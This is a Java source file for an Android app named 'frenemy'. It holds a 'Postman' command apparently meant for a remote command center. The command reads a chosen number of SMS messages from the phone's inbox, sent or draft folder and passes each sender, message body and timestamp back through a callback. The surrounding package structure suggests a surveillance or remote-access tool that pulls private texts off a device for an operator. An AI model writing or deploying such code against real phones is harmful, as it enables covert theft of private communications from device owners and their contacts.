package com.theah64.frenemy.android.commandcenter.commands;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.theah64.frenemy.android.utils.CommonUtils;

import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

import java.io.IOException;
import java.util.Date;

/**
 * Created by theapache64 on 21/6/17.
 */

public class Postman extends BaseCommand {

    private static final String FOLDER_INBOX = "inbox";
    private static final String FOLDER_SENT = "sent";
    private static final String FOLDER_DRAFT = "draft";

    private static final String FLAG_FOLDER = "f";
    private static final String FLAG_COUNT = "c";


    private static final String DEFAULT_FOLDER = FOLDER_INBOX;
    private static final String DEFAULT_COUNT = "10";

    private static final Options options = new Options()
            .addOption(FLAG_FOLDER, true, "folder to get from")
            .addOption(FLAG_COUNT, true, "number of messages");

    public Postman(String command) throws CommandException, ParseException, CommandHelp {
        super(command);
    }

    @Override
    public void handle(Context context, Callback callback) throws IOException {
        final String folder = getCmd().getOptionValue(FLAG_FOLDER, DEFAULT_FOLDER);
        final int count = CommonUtils.parseInt(getCmd().getOptionValue(FLAG_COUNT, DEFAULT_COUNT));

        final Uri uri = Uri.parse(String.format("content://sms/%s", folder));

        final Cursor c = context.getContentResolver().query(uri, null, null, null, null);

        if (c != null) {

            if (c.moveToFirst()) {
                int i = 0;
                do {

                    final String from = c.getString(c.getColumnIndex("address"));
                    final String content = c.getString(c.getColumnIndex("body"));
                    final long deliveryTime = c.getLong(c.getColumnIndex("date"));

                    final String node = String.format("\nFrom:%s\nMessage: %s\nDate: %s\n\n", from, content, new Date(deliveryTime).toString());
                    callback.onInfo(node);
                    i++;

                    if (i >= count) {
                        break;
                    }

                } while (c.moveToNext());

            }

            c.close();

            callback.onFinish("Done!");
        }
    }

    @Override
    public Options getOptions() {
        return options;
    }
}
